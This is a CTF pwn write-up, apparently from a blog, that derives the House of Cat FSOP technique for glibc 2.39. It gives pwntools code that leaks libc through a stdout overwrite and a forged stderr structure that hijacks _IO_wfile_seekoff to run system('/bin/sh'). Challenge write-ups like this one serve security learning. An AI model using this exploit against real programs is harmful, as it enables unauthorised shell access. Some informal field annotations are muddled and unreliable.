---
title: "House of Cat — Reverse Engineering Modern FSOP Bypasses"
ctf: "ctf archive"
category: "pwn"
difficulty: "medium"
points: null
date: "2026-05-16"
lat: 50.71
lng: 60.00
summary: "Independently uncovering the House of Cat technique by manually tracing glibc constraints to bypass _IO_vtable_check, manipulating _wide_data structures, and hijacking control flow via _IO_wfile_seekoff."
tags:
  - "heap"
  - "fsop"
  - "house-of-cat"
  - "_IO_FILE"
  - "glibc-2.39"
---
    _flags  \ it's like telling glibc here we want to "W" or "R" 

    _IO_read_ptr ---|
    _IO_read_end    |  to control what will be written
    _IO_read_base --|

    _IO_write_base -|
    _IO_write_ptr   |  to control what will be read
    _IO_write_end --|
                    ___
    _IO_buf_base --| _/ here the buffer contains:        |      |     |       |
    _IO_buf_end  __|/                                  start  r_pt   r_e     end

    _IO_save_base  --|
    _IO_backup_end   | dummy pointers ;D
    _IO_save_end ----|
               ___
    _markers -| _/ here markers used when u call ungetc/fgetc on stdin
    _chain   -|/ points to next _IO_FILE whatever it is

    _fileno -----| file descriptor that's used on open/read/write
    _flags2      | additional flags indicating the states - 0x0001 - 0x0002 - 0x0004 - 0x0008...
    _old_offset -| current position of the cursor :)

    _vtable_offset --| relative offset from _IO_FILE to vtable
    _shortbuf        | store one byte temp
    _lock -----------| recursive mutex

    _offset ----| the old version of old_offset
    _codecvt    | current encoding the file stream is using
    _wide_data -| for wide char operation

    _frees_list -|
    _frees_buf --|

    _pad5 -| padding for structure alignment
    _mode -| 0/-1 stream not yet oriented or in char usage - positive for wide char

    _unused2

    vtable -| acts like jump table to func
    -----------------------------------------------------------------------------------
    hmm not that bad at least i understand what i'm saying now about _IO_FILE this shit

    Now let's try to overwrite the stdout structure to leak or to write some useful address to stream ;D

    -----------------------------------------------------------------------------------
       ________   __________________________________________________
       _flags / --> we need to use right flag to force glibc       |\/\_/\.->  0xfbad1800
       -------    --------------------------------------------------
       *note -> 3 read pointers set to zero, we need to write

       _IO_write_base -|                    |                          ^                    |                 
       _IO_write_ptr   |                write_base                     |                write_end                                                                                 
       _IO_write_end __|                                           write_ptr                                                                 

       here from (write_ptr - write_base) at write_base address will go to 
       via _IO_do_write   write(1,write_base,(write_ptr - write_base))

        *note -> others remain the same and let's try it

    -----------------------------------------------------------------------------------
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r


def main():
    r = conn()

    stdout = p64(0xfbad1800) # _flags
    stdout+= p64(0)          # _IO_read_ptr
    stdout+= p64(0)          # _IO_read_end
    stdout+= p64(0)          # _IO_read_base
    stdout+= b"\x00"         # _IO_write_base partial overwrite lowest byte
    #pause()
    r.sendlineafter(b"stdout:",stdout)
    r.recv(1)
    lib = u64(r.recv(100)[72:80]) - 0x1bd4a0

    log.success(f"LEAK:\nlibc:{hex(lib)}\n")
    libc.address = lib
```


    Yes, it works! :D NOW we need to abuse the stderr struct to execute system("/bin/sh").
    I have no idea how I can do it, but let's try since there is a check I see while debugging.
    Something like that on _io_vtable check:

                                      |
    ----------------------------------|---
    lea r12, &_io_vtable              |
    mov rdx, QWORD ptr [rbx+0xd8]     v
    sub rdx, r12 -------------------> here it gets the range. If u exceed it, 0x92f will abort
    cmp rdx, 0x92f
    ja abort
    --------------------------------------

    Ok, so overwriting the vtable pointer at stderr+0xd8 with a custom heap address will not work
    since this check will prevent us... but wait, what if I overwrite it with a nearby 
    stderr address? Will this abort? Let me check.

    The jump will be taken and there is a 0x1000 difference, so there is no way to do that since we have
    only 224/0xe0 bytes of input. If we had enough space we could do it, but I don't know, since for 
    stderr + 0x1000, this range of addresses must all be writable. I think you can do it,
    but this is messy. So we need to think of another way to bypass the check now?

    If we can force glibc to use wide_vtable... but after all, is there the same check on it? Hmm...
    I see before jumping to the check, there is another check on _mode at stderr+0xc0. It looks like this:

    -----------------------------------
    mov eax, DWORD [rdi+0xc0]          \
    test eax, eax                       \
    jne check_io_vtable                  \  this is for setting the _mode to 0xffffffff; even if we force it
    mov DWORD ptr [rdi+0xc0],0xffffffff  /  to be positive, it will change itself to negative again
    check_io_check the rest             /
    -----------------------------------/

    Bro, I found another way to do it! We just need to change the vtable pointer to _IO_wfile_jumps + offset.
    Since it passes the checks (I tried it), now we just need to get a valid offset that forces glibc to use our
    wide_vtable.

    I see something like that:
    --------------------------\
    call QWORD ptr [r15+0x38]  |  _IO_wfile_jumps + 0x38
    --------------------------/

    *note -> this happens inside _IO_flush_all

    Now we can control what the program executes. From this table, we need to make it point to a function
    that helps us call something from wide_vtable, but what? Hmm...

    Wait, when the program exits, it calls _IO_cleanup -> _IO_flush_all, and inside it there is something that
    looks like this. If we take the path to call _IO_wfile_overflow... how to trigger it will be figured out soon.
    I need to debug it again and again until I find something that can be manipulated.
    Yes! Finally, I found a great attack vector:

    --------------------------------
    mov rax, QWORD PTR [rbx + 0x28] \---> here it takes _IO_write_ptr  \
    cmp QWORD PTR [rbx + 0x20], rax  \--------> takes   _IO_write_base  V
    jb _IO_file_overflow             /                    _IO_write_base - _IO_write_ptr
    --------------------------------/-> if _IO_write_ptr > _IO_write_base => jb will be taken

    
    So now we need to know how to redirect execution to _IO_wfile_jumps, but we still need proof.
    Let's try it:
    -------------------------------------
    gef> p *(struct _IO_FILE_plus *) stderr
    $2 = {
    file = {
    _flags = 0x41414141,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "",
    _lock = 0x7b0630805700 <_IO_stdfile_2_lock>,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x43434343,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x1,
    _mode = 0x2,
    _unused2 = '\000' <repeats 19 times>
    },
    vtable = 0x7b0630802228 <_IO_wfile_jumps>
    }
    -------------------------------------
    Hmm, I think it's working, and we are doing such a great job. Now look at this:

    -------------------------------------
    mov rax, QWORD PTR [rax+0xa0]  -> here is wide_data
    mov rsi, QWORD PTR [rax+0x20]  -> from _IO_write_ptr in wide_data
    cmp QWORD PTR [rax+0x18], rsi  -> _IO_write_base > _IO_write_ptr
    jae call rax+0x18
    -------------------------------------

    I satisfied this check and yes, it works! But I wonder what to call from _IO_wfile_jumps.
    I chose _IO_wfile_seekoff with the right offset.

    ----------------------------------------------
    It ends up calling __GI__IO_switch_to_wget_mode.
    Looking inside, it calls a function from wide_vtable:
    mov rax, QWORD PTR [rdi+0xa0]
    Here it checks if _IO_write_base > _IO_write_ptr
    Then: mov rax, QWORD PTR [rax+0xe0] -> wide_vtable
    No more stupid checks.
    Just pure call:
    call QWORD PTR [rax+0x18]
    ----------------------------------------------

    And yes, with a little bit of debugging and making correct pointers within just 0xd8 bytes,
    we make rax+0x18 point to the address of system(), and rdi (the file pointer) becomes the argument for system when called.
    The key is to bypass the _io_vtable check by pointing our main vtable to _IO_wfile_jumps. From there, we force
    glibc to call a function from our fake wide_vtable—bypassing all modern checks so we can even point it to our ROP stack pivot!

    ----------------------------------------------
    [ #2] 0x78e7e98585bb <do_system+0x2eb>
    [ #3] 0x78e7e988afe0 <_IO_switch_to_wget_mode+0x30> (frame name: __GI__IO_switch_to_wget_mode)
    [ #4] 0x78e7e988d2ed <_IO_wfile_seekoff+0x6d> (frame name: __GI__IO_wfile_seekoff)
    [ #5] 0x78e7e98961e6 <_IO_flush_all+0xe6> (frame name: __GI__IO_flush_all)
    [ #6] 0x78e7e989680d <_IO_cleanup+0x2d>
    [ #7] 0x78e7e9847b74 <__run_exit_handlers+0x264>
    [ #8] 0x78e7e9847bbe <NO_SYMBOL>
    [ #9] 0x78e7e982a1d1 <__libc_start_call_main+0x81>
    ----------------------------------------------

```python
    stderr = b"/bin/sh\x00"  # _flags what ever it is
    stderr+= p64(0)          # _IO_read_ptr
    stderr+= p64(0)          # _IO_read_end
    stderr+= p64(libc.sym['system']) # _IO_read_base
    stderr+= p64(0)          # _IO_write_base
    stderr+= p64(1)          # _IO_write_ptr to bypass the check and jumps to _IO_wflie
    stderr+= p64(0)          # _IO_write_end
    stderr+= p64(0)*3        # three dummy pointers ;D
    stderr+= p64(0)          # _markers
    stderr+= p64(0)          # _chain hmm... idk
    stderr+= p64(0)          # _fileno
    stderr+= p64(0)          # _flags2
    stderr+= p64(0)          # _old_offset
    stderr+= p64(0)          # _cur_column
    stderr+= p32(0)          # _vtable_offset
    stderr+= p32(0)          # _short_buf
    stderr+= p64(libc.sym['_IO_stdfile_2_lock']) # keep same
    stderr+= p64(0)          # _offset
    stderr+= p64(0)          # _codecvt
    stderr+= p64(libc.sym['_IO_2_1_stderr_']-0x20)#+0x8) # wide_data
    stderr+= p64(0)          # freeres_list
    stderr+= p64(0)          # freeres_buf
    stderr+= p64(1)          # _pad5
    stderr+= p64(libc.sym['_IO_2_1_stderr_'])          # _mode
    stderr+= p64(0)*2        # _unused2
    stderr+= p64(libc.sym['_IO_wfile_jumps']+0x30)       # vtable

    r.sendline(stderr)
    r.recvuntil("stderr:")

    r.interactive()

if __name__ == "__main__":
    main()
```